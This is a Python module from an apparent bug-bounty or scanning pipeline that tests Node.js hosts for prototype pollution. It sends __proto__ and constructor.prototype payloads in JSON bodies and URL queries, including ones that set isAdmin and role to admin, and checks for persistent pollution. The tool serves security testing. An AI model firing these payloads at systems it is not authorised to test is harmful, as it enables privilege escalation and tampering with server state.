#!/usr/bin/env python3
# engines/proto_pollution.py — V7 Prototype Pollution Engine
# Tests Node.js apps for __proto__, constructor, prototype injection
# MilkyWay Intelligence | Author: Sharlix

import json
import urllib.parse
from core.http_client import sync_get, sync_post
from core.utils import safe_read

# Test property injected to detect pollution
CANARY_PROP  = "m7v7_pp_test"
CANARY_VALUE = "m7v7_polluted_12345"

# Prototype pollution payloads (JSON body + URL param)
PP_JSON_PAYLOADS = [
    {CANARY_PROP: CANARY_VALUE, "__proto__": {CANARY_PROP: CANARY_VALUE}},
    {CANARY_PROP: CANARY_VALUE, "constructor": {"prototype": {CANARY_PROP: CANARY_VALUE}}},
    {CANARY_PROP: CANARY_VALUE, "__proto__": {"isAdmin": True, "role": "admin"}},
    {"__proto__": {"polluted": True}},
]

PP_URL_PAYLOADS = [
    f"__proto__[{CANARY_PROP}]={CANARY_VALUE}",
    f"constructor[prototype][{CANARY_PROP}]={CANARY_VALUE}",
    f"__proto__[isAdmin]=true",
    f"constructor[prototype][isAdmin]=true",
]

# Response indicators
PP_INDICATORS = [
    CANARY_VALUE,
    '"isAdmin":true',
    '"polluted":true',
    '"m7v7_polluted',
]

NODE_INDICATORS = [
    "express","node.js","next.js","nestjs","koa","fastify",
    "x-powered-by: express","x-powered-by: next.js",
]


class ProtoPollutionEngine:
    """
    Prototype Pollution Testing Engine.

    Targets: Node.js / JavaScript applications
    Methods: JSON body injection, URL query pollution, header pollution

    Detection: Canary value pollution — inject unique value via __proto__,
               check if it appears in subsequent response fields.
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        live  = self.p.files.get("live_hosts","")
        urls  = self.p.files.get("urls","")
        out   = f"{self.p.out}/{self.p.prefix}_proto_pollution.txt"
        found = 0

        hosts = safe_read(live)[:15]
        all_urls = safe_read(urls)

        for host in hosts:
            # Step 1: Detect if Node.js
            if not self._is_nodejs(host):
                continue
            self.log.info(f"  Proto Pollution: Node.js detected at {host}")

            # Step 2: Find JSON API endpoints
            api_urls = [u for u in all_urls if host in u and
                        any(p in u for p in ["/api/","/v1/","/v2/"])][:20]
            api_urls.append(host)  # root too

            for url in api_urls:
                # Test JSON body pollution
                result = self._test_json_pollution(url)
                if result:
                    sev, detail = result
                    with open(out,"a") as f:
                        f.write(f"PROTO_POLLUTION: {url} | {detail}\n")
                    self.p.add_finding(sev, "PROTOTYPE_POLLUTION", url, detail,
                                       "proto-pollution")
                    found += 1; continue

                # Test URL query pollution
                result2 = self._test_url_pollution(url, all_urls)
                if result2:
                    sev, detail = result2
                    with open(out,"a") as f:
                        f.write(f"PROTO_POLLUTION_URL: {url} | {detail}\n")
                    self.p.add_finding(sev, "PROTOTYPE_POLLUTION_URL", url, detail,
                                       "proto-pollution")
                    found += 1

        self.log.success(f"Prototype Pollution: {found} findings")

    def _is_nodejs(self, url: str) -> bool:
        """Quick check for Node.js fingerprint."""
        resp = sync_get(url)
        if not resp: return False
        headers_str = str(resp.get("headers","")).lower()
        body_lower  = resp.get("body","").lower()
        return any(sig in headers_str or sig in body_lower for sig in NODE_INDICATORS)

    def _test_json_pollution(self, url: str) -> tuple:
        """Test JSON body prototype pollution."""
        auth_h = {}
        if getattr(self.p.args,"cookie",None):
            auth_h["Cookie"] = self.p.args.cookie

        for payload in PP_JSON_PAYLOADS:
            # Get baseline
            baseline = sync_post(url, json_data={"test": "baseline"}, headers=auth_h)
            if not baseline: continue
            baseline_body = baseline.get("body","")

            # Send pollution payload
            resp = sync_post(url, json_data=payload, headers=auth_h)
            if not resp: continue
            body = resp.get("body","")

            for indicator in PP_INDICATORS:
                if indicator in body and indicator not in baseline_body:
                    detail = (f"Prototype pollution via JSON __proto__: "
                              f"canary '{indicator}' appeared in response")
                    return ("high", detail)

            # Check if subsequent GET now has polluted property
            check = sync_get(url, headers=auth_h)
            if check:
                for indicator in PP_INDICATORS:
                    if indicator in check.get("body",""):
                        detail = (f"Persistent prototype pollution: "
                                  f"'{indicator}' persists after __proto__ injection")
                        return ("critical", detail)

        return None

    def _test_url_pollution(self, base_url: str, all_urls: list) -> tuple:
        """Test URL query parameter prototype pollution."""
        auth_h = {}
        if getattr(self.p.args,"cookie",None):
            auth_h["Cookie"] = self.p.args.cookie

        # Find URLs with existing query params
        target_urls = [u for u in all_urls if "?" in u and base_url.split("//")[1].split("/")[0] in u]
        target_urls.append(base_url)

        for url in target_urls[:5]:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            except Exception:
                continue

            for pp_payload in PP_URL_PAYLOADS:
                # Append pollution to existing query
                sep      = "&" if parsed.query else "?"
                test_url = url.split("?")[0] + "?" + parsed.query + sep + pp_payload
                resp     = sync_get(test_url, headers=auth_h)
                if not resp: continue

                body = resp.get("body","")
                for indicator in PP_INDICATORS:
                    if indicator in body:
                        detail = (f"URL query prototype pollution: "
                                  f"'{pp_payload[:50]}' → '{indicator}' in response")
                        return ("high", detail)

        return None
